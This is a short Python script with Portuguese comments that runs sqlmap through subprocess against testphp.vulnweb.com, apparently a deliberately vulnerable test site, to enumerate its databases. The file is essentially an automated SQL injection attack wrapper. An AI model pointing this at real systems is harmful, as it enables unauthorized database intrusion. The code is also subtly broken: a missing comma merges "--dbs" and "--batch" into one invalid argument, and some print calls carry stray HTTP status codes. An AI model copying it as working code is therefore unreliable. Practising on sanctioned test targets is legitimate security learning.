import subprocess

target_url_para_scanner = "http://testphp.vulnweb.com/listproducts.php?cat=1"
command = [
    "sqlmap",
    "-u",
    target_url_para_scanner,
    "--dbs"
    "--batch",
    "--risk=1"
]

try: 
    result = subprocess.run(
        command, 
        capture_output=True,
        text=True,
        timeout=300,
        check =False 
    )
    
    
    #Processando resultado
    if result.returncode != 0:
        print(f"Erro ao executar o comando sqlmap: {result.stderr}", 500)
        
        
    raw_output = result.stdout
    print(raw_output)
except subprocess.TimeoutExpired:
    print("O comando sqlmap excedeu o tempo limite.")
except Exception as e:
    print(f"Ocorreu um erro ao executar o comando sqlmap: {e}", 500)
